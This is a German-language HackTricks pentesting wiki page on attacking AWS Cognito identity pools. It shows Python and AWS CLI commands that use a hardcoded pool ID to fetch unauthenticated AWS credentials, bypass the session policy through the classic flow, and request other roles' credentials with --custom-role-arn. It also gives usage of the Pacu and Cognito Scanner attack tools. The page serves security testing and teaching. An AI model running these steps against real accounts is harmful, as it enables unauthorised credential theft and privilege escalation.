# Cognito Identit√§tspools

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

## Grundlegende Informationen

Identit√§tspools spielen eine entscheidende Rolle, indem sie es Ihren Benutzern erm√∂glichen, **tempor√§re Anmeldeinformationen zu erhalten**. Diese Anmeldeinformationen sind unerl√§sslich f√ºr den Zugriff auf verschiedene AWS-Dienste, einschlie√ülich, aber nicht beschr√§nkt auf Amazon S3 und DynamoDB. Ein bemerkenswertes Merkmal von Identit√§tspools ist ihre Unterst√ºtzung sowohl f√ºr anonyme Gastbenutzer als auch f√ºr eine Reihe von Identit√§tsanbietern zur Benutzerauthentifizierung. Die unterst√ºtzten Identit√§tsanbieter umfassen:

- Amazon Cognito-Benutzerpools
- Soziale Anmeldeoptionen wie Facebook, Google, Anmeldung bei Amazon und Anmeldung bei Apple
- Anbieter, die OpenID Connect (OIDC) entsprechen
- SAML (Security Assertion Markup Language) Identit√§tsanbieter
- Entwicklerauthentifizierte Identit√§ten
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Um Identit√§ts-Pool-Sitzungen zu generieren, m√ºssen Sie zuerst eine **Identit√§ts-ID generieren**. Diese Identit√§ts-ID ist die **Identifizierung der Sitzung dieses Benutzers**. Diese Identifizierungen k√∂nnen bis zu 20 Datens√§tze haben, die jeweils bis zu 1 MB Schl√ºssel-Wert-Paare speichern k√∂nnen.

Dies ist **n√ºtzlich, um Informationen √ºber einen Benutzer zu speichern** (der immer dieselbe Identit√§ts-ID verwenden wird).

Dar√ºber hinaus ist der Dienst **cognito-sync** der Dienst, der es erm√∂glicht, diese Informationen zu **verwalten und zu synchronisieren** (in den Datens√§tzen, indem Informationen in Streams und SNS-Nachrichten gesendet werden...).

### Tools f√ºr Pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), das AWS-Exploitation-Framework, enth√§lt jetzt die Module "cognito\_\_enum" und "cognito\_\_attack", die die Enumeration aller Cognito-Ressourcen in einem Konto automatisieren und schwache Konfigurationen, f√ºr den Zugriffskontrolle verwendete Benutzerattribute usw. kennzeichnen, au√üerdem automatisieren sie die Benutzererstellung (einschlie√ülich MFA-Unterst√ºtzung) und die Privilegieneskalation basierend auf √§nderbaren benutzerdefinierten Attributen, verwendbaren Identit√§ts-Pool-Anmeldeinformationen, √ºbernehmbaren Rollen in ID-Token usw.

F√ºr eine Beschreibung der Funktionen der Module siehe Teil 2 des [Blog-Beitrags](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). F√ºr Installationsanweisungen siehe die Hauptseite von [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Verwendung

Beispielhafte Verwendung von cognito\_\_attack, um die Benutzererstellung zu versuchen und alle Privilegieneskalationsvektoren gegen einen bestimmten Identit√§ts-Pool und Benutzer-Pool-Client durchzuf√ºhren:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Beispiel f√ºr die Verwendung von cognito\_\_enum, um alle Benutzerpools, Benutzerpool-Clients, Identit√§tspools, Benutzer usw. zu sammeln, die im aktuellen AWS-Konto sichtbar sind:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) ist ein CLI-Tool in Python, das verschiedene Angriffe auf Cognito implementiert, einschlie√ülich unerw√ºnschter Kontenerstellung und Identit√§tspool-Eskalation.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Verwendung
```bash
$ cognito-scanner --help
```
F√ºr weitere Informationen besuchen Sie https://github.com/padok-team/cognito-scanner

## Zugriff auf IAM-Rollen

### Nicht authentifiziert

Das Einzige, was ein Angreifer wissen muss, um in einer Cognito-App als nicht authentifizierter Benutzer **AWS-Anmeldeinformationen zu erhalten**, ist die **Identit√§tspool-ID**, und diese **ID muss im Web-/Mobile-**Anwendung **fest codiert** sein, damit sie verwendet wird. Eine ID sieht so aus: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (sie ist nicht durch Brute-Force zu erraten).

{% hint style="success" %}
Die **IAM Cognito nicht authentifizierte Rolle, die √ºber** erstellt wird, hei√üt standardm√§√üig `Cognito_<Identity Pool-Name>Unauth_Role`
{% endhint %}

Wenn Sie eine fest codierte Identit√§tspool-ID finden und es nicht authentifizierten Benutzern erlaubt, k√∂nnen Sie AWS-Anmeldeinformationen erhalten:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Oder Sie k√∂nnten die folgenden **AWS CLI-Befehle** verwenden:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Beachten Sie, dass ein nicht authentifizierter Cognito-Benutzer standardm√§√üig **keine Berechtigung haben kann, auch wenn sie √ºber eine Richtlinie zugewiesen wurde**. √úberpr√ºfen Sie den folgenden Abschnitt.
{% endhint %}

### Verbesserter vs. grundlegender Authentifizierungsablauf

Der vorherige Abschnitt folgte dem **Standard-Authentifizierungsablauf**. Dieser Ablauf legt eine **restriktive** [**Sitzungsrichtlinie**](../../aws-basic-information/#session-policies) f√ºr die generierte IAM-Rollensitzung fest. Diese Richtlinie erlaubt der Sitzung nur, [**die Dienste aus dieser Liste zu verwenden**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (auch wenn die Rolle Zugriff auf andere Dienste hatte).

Es gibt jedoch eine M√∂glichkeit, dies zu umgehen: Wenn der **Identit√§tspool "Basic (Classic) Flow" aktiviert hat**, kann der Benutzer eine Sitzung mit diesem Ablauf erhalten, der **keine restriktive Sitzungsrichtlinie** haben wird.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Wenn Sie diesen **Fehler** erhalten, liegt das daran, dass der **Grundfluss nicht aktiviert ist (Standard)**

`Ein Fehler ist aufgetreten (InvalidParameterException) beim Aufruf der GetOpenIdToken-Operation: Der Grund (klassisch) ist nicht aktiviert, bitte verwenden Sie den erweiterten Fluss.`
{% endhint %}

Wenn Sie √ºber einen Satz IAM-Anmeldeinformationen verf√ºgen, sollten Sie √ºberpr√ºfen, [auf welche Zugriffsrechte Sie zugreifen k√∂nnen](../../#whoami) und versuchen, [Berechtigungen zu eskalieren](../../aws-privilege-escalation/).

### Authentifiziert

{% hint style="info" %}
Denken Sie daran, dass **authentifizierte Benutzer** wahrscheinlich **unterschiedliche Berechtigungen** erhalten, daher sollten Sie, wenn Sie sich **innerhalb der App registrieren k√∂nnen**, dies versuchen und die neuen Anmeldeinformationen erhalten.
{% endhint %}

Es k√∂nnten auch **Rollen** f√ºr **authentifizierte Benutzer, die auf den Identit√§tspool zugreifen**, verf√ºgbar sein.

Daf√ºr ben√∂tigen Sie m√∂glicherweise Zugriff auf den **Identit√§tsanbieter**. Wenn es sich um ein **Cognito-Benutzerpool** handelt, k√∂nnen Sie m√∂glicherweise das Standardverhalten missbrauchen und **einen neuen Benutzer erstellen**.

{% hint style="success" %}
Die **IAM Cognito authentifizierte Rolle, die √ºber erstellt wird, hei√üt standardm√§√üig** `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

Wie auch immer, das **folgende Beispiel** setzt voraus, dass Sie sich bereits in einem **Cognito-Benutzerpool** angemeldet haben, der zum Zugriff auf den Identit√§tspool verwendet wird (vergessen Sie nicht, dass auch andere Arten von Identit√§tsanbietern konfiguriert sein k√∂nnten).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Holen Sie sich die identity_id aus der vorherigen Befehlsantwort
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Im IdToken k√∂nnen Sie Rollen finden, auf die ein Benutzer zugreifen kann, weil er Mitglied von Benutzerpoolgruppen ist
# Verwenden Sie --custom-role-arn, um Anmeldeinformationen f√ºr eine bestimmte Rolle zu erhalten
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Es ist m√∂glich, **verschiedene IAM-Rollen zu konfigurieren, je nachdem, von welchem Identit√§tsanbieter** der Benutzer angemeldet ist oder sogar nur **vom Benutzer** (unter Verwendung von Claims). Daher, wenn Sie Zugriff auf verschiedene Benutzer durch denselben oder verschiedene Anbieter haben, k√∂nnte es sich lohnen, sich anzumelden und auf die IAM-Rollen aller zuzugreifen.
{% endhint %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
